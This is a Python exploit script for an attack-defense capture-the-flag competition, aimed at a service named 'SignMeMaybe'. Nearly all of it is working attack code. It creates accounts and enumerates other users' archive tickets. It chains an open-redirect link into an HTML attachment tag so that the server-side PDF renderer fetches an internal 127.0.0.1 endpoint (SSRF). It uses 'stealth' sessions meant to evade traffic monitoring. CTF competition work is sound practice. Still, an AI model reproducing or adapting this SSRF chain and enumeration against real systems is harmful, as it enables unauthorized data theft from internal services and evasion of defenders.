#!/usr/bin/env python3

import hashlib
import sys
from pathlib import Path
from urllib.parse import quote, urlencode

CLIENT_DIR = Path(__file__).resolve().parent
sys.path.insert(0, str(CLIENT_DIR / "include"))

from utils import *

# useful functions and variables
#
# ip                             - variable with ip
# target                         - variable with http target url
# service_id                     - variable with service id
# port                           - variable with port
# get_team_id(str)               - gets team id for ip
# get_flagids(str)               - gets flag id for ip (for service set at the beginning of this file)
# rand_string(int)               - generates random string of length
# rand_string_pattern(str)       - generates random string of given format ("AAaaa0" generates
#                                  2 capital letters, 3 lowercase, and 1 number)
# flag(any)                      - prints the flag with flush
# flags(str)                     - regex finds all flags in given string and prints them
# session(headers=None)          - returns a new request.Session()
# stealth_session(headers=None)  - returns a new request.Session() that doesn't persist TCP connection
#                                  between requests in order to make exploits harder to trace in
#                                  tools like Clover/Tulip
# fake_flags(num)                - Returns a list of fake flags matching the flag regex and adds them
#                                  to our database so we don't submit them

exploit(service_id="SignMeMaybe", port=1984)

### EXPLOIT BELOW HERE

PORT = 1984


def account_for_target():
    digest = hashlib.sha256(ip.encode()).hexdigest()
    username = f"ire57_{digest[:20]}"
    password = f"P-{digest[20:52]}"
    s = stealth_session()

    response = s.post(
        f"{target}/api/register",
        json={"username": username, "password": password},
        timeout=4,
    )

    if response.status_code == 409:
        response = s.post(
            f"{target}/api/login",
            json={"username": username, "password": password},
            timeout=4,
        )

    response.raise_for_status()
    s.headers["X-Session-Token"] = response.json()["token"]
    return s


def archive_tickets(s, victim_username):
    response = s.get(
        f"{target}/api/users/{quote(victim_username, safe='')}/contracts",
        timeout=4,
    )

    if not response.ok:
        return []

    return [
        item["archiveTicket"]
        for item in response.json().get("contracts", [])
        if item.get("archiveTicket")
    ]


def fetch_packet_in_pdf(s, ticket):
    internal_url = f"http://127.0.0.1:{PORT}/internal/archive/packets/{quote(ticket, safe='')}"
    leave_url = f"{target}/api/links/leave?{urlencode({'to': internal_url})}"
    content = f'<link rel="attachment" href="{leave_url}" title="annex.txt">'

    response = s.post(
        f"{target}/api/contracts",
        json={
            "title": f"annex-{rand_string(10)}",
            "content": content,
        },
        timeout=6,
    )

    if not response.ok:
        return b""

    reference = response.json().get("reference")
    if not reference:
        return b""

    response = s.get(
        f"{target}/api/contracts/{quote(reference, safe='')}/versions/latest/pdf",
        timeout=6,
    )

    return response.content if response.ok else b""


def main():
    try:
        s = account_for_target()

        for victim_username in get_flagids(ip):
            for ticket in archive_tickets(s, victim_username):
                packet = fetch_packet_in_pdf(s, ticket)
                flags(packet.decode("latin-1", errors="ignore"))
    except Exception:
        pass


main()
